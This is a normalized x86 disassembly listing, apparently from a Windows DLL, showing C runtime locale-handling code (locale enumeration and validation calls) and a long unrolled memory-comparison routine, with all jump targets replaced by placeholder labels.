neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_10014865
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_1000b9b0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1001497c
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_10014d82
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_10014803
add esp 0xc
test eax eax
je r-xdata
call sub_10014d1b
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_10014d82
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_10014d1b
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1001479b
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_1001a4bf
add esp 0x10
sub_10014faf
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_100165af ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
